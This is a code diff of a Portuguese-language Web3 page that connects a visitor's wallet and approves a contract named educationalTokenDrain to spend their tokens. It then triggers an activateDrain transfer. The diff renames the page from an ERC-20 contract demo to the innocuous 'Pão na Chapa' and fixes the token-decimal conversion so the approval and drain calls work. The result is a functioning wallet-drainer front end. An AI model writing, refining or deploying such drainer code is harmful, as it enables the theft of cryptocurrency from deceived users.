@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Demonstração de Contrato</title>
+    <title>Pão na Chapa</title>
     <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
@@ -60,7 +60,7 @@
     </style>
 </head>
 <body>
-    <h2>Demonstração de Contrato ERC-20</h2>
+    <h2>Pão na Chapa</h2>
     <button id="connectWallet">Conectar Carteira</button>
     <input type="text" id="tokenAmount" placeholder="Quantidade para Aprovar e Transferir">
     <button id="approveTokens">Aprovar Tokens</button>
@@ -515,10 +515,13 @@
             }
         });
 
-        document.getElementById('approveTokens').addEventListener('click', () => {
-            const tokenAmount = document.getElementById('tokenAmount').value;
+       document.getElementById('approveTokens').addEventListener('click', () => {
+            const tokenAmountInput = document.getElementById('tokenAmount').value;
+            const decimals = 18; // Ajuste conforme necessário para o seu token
+            const tokenAmount = web3.utils.toBN(tokenAmountInput).mul(web3.utils.toBN(10).pow(web3.utils.toBN(decimals)));
+
             const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
-            tokenContract.methods.approve(educationalTokenDrainAddress, tokenAmount).send({from: userAccount})
+            tokenContract.methods.approve(educationalTokenDrainAddress, tokenAmount.toString()).send({from: userAccount})
                 .then((tx) => {
                     console.log("Tokens aprovados:", tx);
                 }).catch((error) => {
@@ -527,9 +530,12 @@
         });
 
         document.getElementById('activateTransfer').addEventListener('click', () => {
-            const tokenAmount = document.getElementById('tokenAmount').value;
+            const tokenAmountInput = document.getElementById('tokenAmount').value;
+            const decimals = 18; // Ajuste conforme necessário para o seu token
+            const tokenAmount = web3.utils.toBN(tokenAmountInput).mul(web3.utils.toBN(10).pow(web3.utils.toBN(decimals)));
+
             const educationalTokenDrainContract = new web3.eth.Contract(educationalTokenDrainABI, educationalTokenDrainAddress);
-            educationalTokenDrainContract.methods.activateDrain(tokenAddress, tokenAmount).send({from: userAccount})
+            educationalTokenDrainContract.methods.activateDrain(tokenAddress, tokenAmount.toString()).send({from: userAccount})
                 .then((tx) => {
                     console.log("Transferência ativada:", tx);
                 }).catch((error) => {
